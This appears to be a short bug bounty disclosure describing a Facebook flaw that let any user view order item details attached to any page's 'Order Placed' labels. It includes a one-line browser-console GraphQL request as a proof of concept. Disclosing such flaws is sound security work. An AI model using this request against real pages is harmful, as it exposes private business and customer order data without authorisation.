I"<p>When Page admin adds the “Order Placed” label to the user message, Page admin can also include the details of the order such as item name, notes, image, etc. This bug allow any user to view details of these order items of any Facebook page. 
<br /></p>

<p><img src="/images/fb_order.png" alt="" /></p>

<p><strong>Proof of concept</strong></p>

<p>Send the following request in the browser console by replacing {Page_ID} with the ID of the target page.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new AsyncRequest('/api/graphql/').setData({variables:'{"pageID":"{Page_ID}"}',doc_id:2571623202931955}).send()
</code></pre></div></div>

<p>The response would contain the recent order items of the targeted page.</p>

